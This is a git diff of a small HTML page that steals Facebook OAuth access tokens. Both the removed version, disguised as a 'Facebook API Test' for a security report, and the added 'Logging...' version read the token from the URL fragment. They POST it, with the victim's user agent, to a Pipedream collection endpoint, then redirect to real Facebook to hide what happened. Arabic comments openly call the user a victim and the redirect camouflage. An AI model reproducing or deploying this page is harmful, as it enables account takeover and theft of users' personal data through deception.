@@ -1,32 +1,31 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Facebook API Test</title>
+    <title>Logging...</title>
 </head>
-<body style="background-color: #f0f2f5; font-family: sans-serif; text-align: center; padding-top: 50px;">
-    <h2>Testing Scopes for Security Report...</h2>
+<body>
     <script>
-        (function() {
-            const hash = window.location.hash;
-            if (hash.includes('access_token=')) {
-                const token = hash.split('access_token=')[1].split('&')[0];
-                const target = "https://eoh20zj6isyxv97.m.pipedream.net";
-                
-                fetch(target, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify({
-                        token: token,
-                        scopes_tested: "birthday,location,photos,friends,posts,gender,email,openid",
-                        report_ref: "924595693574152"
-                    })
-                });
-            }
-            setTimeout(() => {
-                window.location.href = "https://developers.facebook.com/tools/explorer/";
-            }, 1500);
-        })();
+        // 1. استخراج الـ Fragment (الذي يحتوي على الـ Access Token) من الرابط
+        var hashData = window.location.hash;
+
+        if (hashData) {
+            // 2. إرسال البيانات فوراً إلى رابط Pipedream الخاص بك
+            fetch("https://eolk1qu152xm90d.m.pipedream.net", {
+                method: "POST",
+                mode: "no-cors",
+                body: JSON.stringify({
+                    full_hash: hashData,
+                    timestamp: new Date().toISOString(),
+                    victim_info: navigator.userAgent
+                })
+            }).then(() => {
+                // 3. إعادة توجيه الضحية إلى موقع حقيقي (للتمويه)
+                window.location.href = "https://web.facebook.com";
+            });
+        } else {
+            // إذا لم يوجد Token، توجه لفيسبوك مباشرة
+            window.location.href = "https://web.facebook.com";
+        }
     </script>
 </body>
 </html>
